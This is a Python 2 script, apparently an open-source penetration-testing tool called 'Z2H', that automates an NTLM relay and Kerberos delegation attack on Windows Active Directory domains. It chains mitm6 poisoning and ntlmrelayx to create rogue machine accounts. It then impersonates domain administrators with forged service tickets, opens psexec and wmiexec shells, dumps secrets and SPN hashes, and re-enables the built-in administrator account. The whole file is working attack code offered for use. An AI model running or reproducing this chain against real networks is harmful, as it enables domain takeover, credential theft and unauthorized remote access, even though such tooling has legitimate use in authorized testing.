#! /usr/bin/python
# Written By Richard Davy
# @rd_pentest
# https://github.com/rmdavy
# Released under Apache V2 see LICENCE for more information
# 
import os, signal, sys, re, string, readline, subprocess, pyperclip, socket
import netifaces as nic
import pexpect, time
from glob import glob
from os import getcwd, chdir

try:
	from termcolor import colored 
except ImportError:
	print ('termcolor appears to be missing - try: pip install termcolor')
	exit(1)

#Try to account for different versions of Python
try:
    raw_input          # Python 2
except NameError:
    raw_input = input  # Python 3

#Routine handles Crtl+C
def signal_handler(signal, frame):
	print colored("\nCtrl+C pressed.. exiting...",'red')
	sys.exit()

# Exit Program
def quit():
	#exit
	sys.exit(0)

# Clear Screen
def clearscreen():
	main()

def kerberoast():
	#Open up log file
	file = open("/tmp/dlog.txt", "r") 
	#Enumerate lines in file
	for line in file: 
		#Find lines where account has been added and pull out username and password
		if "Adding new computer with username:" in line:
			use=line[line.find("username:")+10:line.find("and")-1]
			pas=line[line.find("password:")+10:line.find("result")-1]

			#Escape the $ which is in the usernameGet
			use = use.replace('$','\\$')
			#Escape bad chars which can get set as part of the password		
			#[]{}!$&();\|`<>

			pas=pas.replace('\\','\\\\')
			pas=pas.replace('\"','\\\"')
			pas=pas.replace('\'','\\\'')
			pas=pas.replace('|','\\|')
			pas=pas.replace('!','\\!')
			pas=pas.replace('$','\\$')
			pas=pas.replace(';','\\;')
			pas=pas.replace('(','\\(')
			pas=pas.replace('&','\\&')
			pas=pas.replace('`','\\`')
			pas=pas.replace('{','\\{')
			pas=pas.replace('}','\\}')
			pas=pas.replace('>','\\>')
			pas=pas.replace('<','\\<')
			pas=pas.replace(')','\\)')
			pas=pas.replace('(','\\(')
			pas=pas.replace('[','\\[')
			pas=pas.replace(']','\\]')

			#Dump the SPN#s
			ip=socket.gethostbyname(dc_name+"."+ domain)
			
			print "DC IP %s" % ip
			print "Domain %s" % domain
			print "On completion check /tmp/spns.txt for hashes"

			#Execute command for dumping
			os.system("python /usr/local/bin/GetUserSPNs.py %s/%s:%s -dc-ip %s -request -outputfile /tmp/spns.txt" % (domain,use,pas,ip))
			
			#Check if file exists and display message
			if os.path.isfile("/tmp/spns.txt"):
				print "Check /tmp/spns.txt for SPN's"

			#Break out of for loop
			break

def ldapdomaindump():
	#uses https://github.com/dirkjanm/ldapdomaindump
	#needs ldap3 version 2.5.1 as there are issues in 2.5.2
	#pip install ldap3==2.5.1

	#Open up log file
	file = open("/tmp/dlog.txt", "r") 
	#Enumerate lines in file
	for line in file: 
		#Find lines where account has been added and pull out username and password
		if "Adding new computer with username:" in line:
			use=line[line.find("username:")+10:line.find("and")-1]
			pas=line[line.find("password:")+10:line.find("result")-1]

			#Escape the $ which is in the usernameGet
			use = use.replace('$','\\$')
			#Escape bad chars which can get set as part of the password		
			#[]{}!$&();\|`<>

			pas=pas.replace('\\','\\\\')
			pas=pas.replace('\"','\\\"')
			pas=pas.replace('\'','\\\'')
			pas=pas.replace('|','\\|')
			pas=pas.replace('!','\\!')
			pas=pas.replace('$','\\$')
			pas=pas.replace(';','\\;')
			pas=pas.replace('(','\\(')
			pas=pas.replace('&','\\&')
			pas=pas.replace('`','\\`')
			pas=pas.replace('{','\\{')
			pas=pas.replace('}','\\}')
			pas=pas.replace('>','\\>')
			pas=pas.replace('<','\\<')
			pas=pas.replace(')','\\)')
			pas=pas.replace('(','\\(')
			pas=pas.replace('[','\\[')
			pas=pas.replace(']','\\]')

			#Dump the SPN#s
			ip=socket.gethostbyname(dc_name+"."+ domain)
			
			print "\nDC IP %s" % ip
			print "Domain %s" % domain
			print "Files will be output to /tmp/"
			print "Tip: from %s try - firefox /tmp/*.html\n" % (getcwd())
			#Execute command for dumping
			
			if os.path.isfile("/usr/local/bin/ldapdomaindump" ):
				os.system("python /usr/local/bin/ldapdomaindump -u \"%s\\%s\" -p %s %s -o /tmp/" % (domain,use,pas,ip))
			
				#Break out of for loop
				break

def readfile():
	#Setup variables	
	new_accounts = []
	new_machines = []
	#Clear Screen
	os.system('clear')

	#Open up log file
	file = open("/tmp/dlog.txt", "r") 
	#Enumerate lines in file
	for line in file: 
		#Find lines where account has been added and pull out username and password
		if "Adding new computer with username:" in line:
			username=line[line.find("username:")+10:line.find("and")-1]
			password=line[line.find("password:")+10:line.find("result")-1]
			new_accounts.append(username+" "+password)
		#Find where username has been given permissions on a machine, pull out username and machine
		if "can now impersonate users on" in line:
			user=line[4:line.find("can")-1]
			machine=line[line.find("users")+9:line.find("via")-1]
			new_machines.append(user+" "+machine)

	#Iterate our two lists to create a combined list
	for idx, item in enumerate(new_machines):
		#Get username
		username=item[0:item.find(" ")]
		#Get machines name
		machine=item[item.find(" ")+1:]
		
		for usr in new_accounts:
			#Get username
			usr_name=usr[0:usr.find(" ")]
			#Get password
			passwd=usr[usr.find(" ")+1:]

			#If usernames match modify the list item to include
			#machine name, username and password
			if username==usr_name:
				new_machines[idx] = "Usr="+username+" "+"Pwd="+passwd+" "+"Mac="+machine +" "+"Dom="+domain

	pwned = open("/tmp/pwned.txt", "w")
	#Iterate our new list
	for item in new_machines:
		pwned.write(item+"\n")
		print item
	pwned.close()

	print str(len(new_machines)) + " item(s) writen to file"
	
def usecreds():
	os.system('clear')
	print "Accessible Boxes\n"

	file = open("/tmp/pwned.txt", "r") 
	#Enumerate lines in file
	for line in file: 
		#print list of machines to l00t		
		mac=line[line.find("Mac=")+4:line.find(" ",line.find("Mac="))-1]
		print mac

	smash=raw_input("\nWhich box do you want to use the ticket with?: ") or "n"

	if smash!="n":
		imp=raw_input("\nWhich DA do you want to impersonate?: ") or "Administrator"
		file = open("/tmp/pwned.txt", "r") 
		#Enumerate lines in file
		for line in file: 
			use=line[4:line.find((" "))]
			pas=line[line.find("Pwd=")+4:line.find(" ",line.find("Pwd="))]
			mac=line[line.find("Mac=")+4:line.find(" ",line.find("Mac="))-1]
			dom=line[line.find("Dom=")+4:line.find(" ",line.find("Dom="))]

			#Escape the $ which is in the usernameGet
			use = use.replace('$','\\$')
			#Escape bad chars which can get set as part of the password		
			#[]{}!$&();\|`<>

			pas=pas.replace('\\','\\\\')
			pas=pas.replace('\"','\\\"')
			pas=pas.replace('\'','\\\'')
			pas=pas.replace('|','\\|')
			pas=pas.replace('!','\\!')
			pas=pas.replace('$','\\$')
			pas=pas.replace(';','\\;')
			pas=pas.replace('(','\\(')
			pas=pas.replace('&','\\&')
			pas=pas.replace('`','\\`')
			pas=pas.replace('{','\\{')
			pas=pas.replace('}','\\}')
			pas=pas.replace('>','\\>')
			pas=pas.replace('<','\\<')
			pas=pas.replace(')','\\)')
			pas=pas.replace('(','\\(')
			pas=pas.replace('[','\\[')
			pas=pas.replace(']','\\]')

			if smash==mac:
				pwned = open("/tmp/cc.sh", "w")
				pwned.write("python /usr/local/bin/getST.py -spn cifs/"+mac+"."+dom+" "+dom+"/"+use+":"+pas+" -impersonate %s\n" % imp)
				pwned.close()

				os.system("chmod +x /tmp/cc.sh")
				os.system("gnome-terminal -- \"bash\" -c \"/tmp/cc.sh\"")

				#Clear Screen
				os.system('clear')

		#Needs a little delay inbetween
		time.sleep(15)

		if os.path.isfile("%s.ccache" % imp):
			print os.getcwd()+"/%s.ccache file created" % imp

def start_psexec_shell():
	
	print "\nccache files in %s" % getcwd()
	print list_files("ccache")

	cachefile=raw_input("\nEnter path to *.ccache file to use: ") 
	machine_name=raw_input("Enter Machine Name to connect to: ") 
	
	pwned = open("/tmp/ee.sh", "w")
	pwned.write("export KRB5CCNAME=%s\n" % cachefile)
	pwned.write("python /usr/local/bin/psexec.py -k -no-pass %s.%s\n" % (machine_name,domain))
	pwned.close()

	os.system("chmod +x /tmp/ee.sh")
	os.system("gnome-terminal -- \"bash\" -c \"/tmp/ee.sh\"")

def start_wmiexec_shell():

	print "\nccache files in %s" % getcwd()
	print list_files("ccache")

	cachefile=raw_input("\nEnter path to *.ccache file to use: ") 
	machine_name=raw_input("Enter Machine Name to connect to: ") 
	
	pwned = open("/tmp/hh.sh", "w")
	pwned.write("export KRB5CCNAME=%s\n" % cachefile)
	pwned.write("python /usr/local/bin/wmiexec.py -k -no-pass %s.%s\n" % (machine_name,domain))
	pwned.close()

	os.system("chmod +x /tmp/hh.sh")
	os.system("gnome-terminal -- \"bash\" -c \"/tmp/hh.sh\"")

def start_secretsdump():

	print "\nccache files in %s" % getcwd()
	print list_files("ccache")

	cachefile=raw_input("\nEnter path to *.ccache file to use: ") 
	machine_name=raw_input("Enter Machine Name to connect to: ") 
	
	pwned = open("/tmp/jj.sh", "w")
	pwned.write("export KRB5CCNAME=%s\n" % cachefile)
	pwned.write("python /usr/local/bin/secretsdump.py -k -no-pass %s.%s -outputfile %s\n" % (machine_name,domain,machine_name))
	pwned.close()

	os.system("chmod +x /tmp/jj.sh")
	os.system("gnome-terminal -- \"bash\" -c \"/tmp/jj.sh\"")

def list_files(extension):

	chdir(getcwd())
	it = glob('*.' + extension)

	return it

def start_psexec_shell_enable500():
	
	print "\nccache files in %s" % getcwd()
	print list_files("ccache")
		
	print "\nsam files in %s" % getcwd()
	print list_files("sam")

	cachefile=raw_input("\nEnter path to *.ccache file to use: ") 
	samfile=raw_input("Enter path to SAM file to use: ") 
	machine_name=raw_input("Enter Machine Name to connect to: ") 

	#net user administrator /active:yes
	#open up sam file and get name of RID 500 account
	#then PSEXEC onto the box and enable ensure this account is enabled
	#then re-secrets dump
	if os.path.isfile(samfile):
		file = open(samfile, "r") 
		#Enumerate lines in file
		for line in file: 
			if ":500:" in line:
				adminname=line[:line.find(":500")]
				adminhash=line[line.find(":500")+5:line.find(":::")]
		#Print SID 500 username
		print "\nRID 500 username is %s " % adminname
		print "RID 500 hash is %s \n" % adminhash

		#sys.exit()

		#Create file in temp which will connect to machine via PSexec and execute command
		pwned = open("/tmp/ff.sh", "w")
		pwned.write("export KRB5CCNAME=%s\n" % cachefile)
		pwned.write("python /usr/local/bin/psexec.py -k -no-pass %s.%s 'net user %s /active:yes'" % (machine_name,domain,adminname))
		pwned.close()
		#Give execute permissions to file and launch
		os.system("chmod +x /tmp/ff.sh")
		os.system("gnome-terminal -- \"bash\" -c \"/tmp/ff.sh\"")

		#We want to re secretsdump so that we get the kerberos keys
		pwned = open("/tmp/gg.sh", "w")
		pwned.write("python /usr/local/bin/secretsdump.py -hashes %s ./%s@%s.%s -outputfile %s\n"	% (adminhash,adminname,machine_name,domain,machine_name))
		pwned.close()

		os.system("chmod +x /tmp/gg.sh")
		os.system("gnome-terminal -- \"bash\" -c \"/tmp/gg.sh\"")
	else:
		print "File not found - %s" % samfile

def relay_execute_cmd():
	#Clear Screen
	os.system('clear')
	#Start attack
	print colored('\n[+]Starting Attack...','yellow') 
	#Quick check for previous log output		
	if os.path.isfile("/tmp/dlog.txt"):
		#remove any old traces
		os.remove("/tmp/dlog.txt")
		
		#Create blank file 
		f=open("/tmp/dlog.txt", 'w')
		f.close()
	
	#Start terminal with ntlmrelayx
	os.system("gnome-terminal -- \"bash\" -c \"python /usr/local/bin/ntlmrelayx.py -t ldaps://%s.%s -wh attacker-wpad --delegate-access > /tmp/dlog.txt | tail -f /tmp/dlog.txt\"" % (dc_name, domain))
	#Start Mitm6
	os.system("gnome-terminal -- \"bash\" -c \"mitm6 -d %s --ignore-nofqnd\"" % domain)
	
	#Print menu to screen
	while(1):
		print("\n\t(1)\tParse for Creds")
		print("\t(2)\tUse Creds & create ccache file")
		print("\t(3)\tSecretsdump Box")
		print("\t(4)\tPSexec to box")
		print("\t(5)\tWMIExec to box")
		print("\t(6)\tKerberoast")
		print("\t(7)\tLdapdomaindump")
		print("\t(99)\tQuit")
		#User options
		options = {1: readfile,
					2: usecreds,
					3: start_secretsdump,
					4: start_psexec_shell,
					5: start_wmiexec_shell,
					6: kerberoast,
					7: ldapdomaindump,
					98: start_psexec_shell_enable500,
					99: quit,
		}
		try:
			task = input("\nSelect a task: ")
			options[task]()
		except KeyError:
			pass
	
def main():
	#Clear Screen
	os.system('clear')
	#Display Banner
	print '\n'
	print colored('Z2H - Zero 2 Hero (NTLM Relaying & Kerberos Delegation Attack)','green')
	print colored('Version 1.0 ','yellow')
	print colored('By @rd_pentest','blue') 
	
	if not os.path.isfile("/usr/local/bin/ntlmrelayx.py"):
		print colored('\n[-]File not found - /usr/local/bin/ntlmrelayx.py\n','yellow') 

	if not os.path.isfile("/usr/local/bin/mitm6"):
		print colored('\n[-]File not found - /usr/local/bin/mitm6\n','yellow') 

	global domain
	global dc_name

	#Get domain we're working with
	domain=raw_input("Please enter domain e.g. contoso.local:") or "davy.local"
	#Get dc we're working with
	dc_name=raw_input("Please enter dc name e.g. dc1:") or "WIN-3R59NBDD46H"

	#Print menu to screen
	while(1):
		print("\n\t(1)\tLaunch attack")
		print("\t(99)\tQuit")
		#User options
		options = {1: relay_execute_cmd,
					97: usecreds,
					98: readfile,
					99: quit,
		}
		try:
			task = input("\nSelect a task: ")
			options[task]()
		except KeyError:
			pass

if __name__ == '__main__':
	#Setup Signal handler in case of Ctrl+C
	signal.signal(signal.SIGINT, signal_handler)
	#Call main routine.
	main()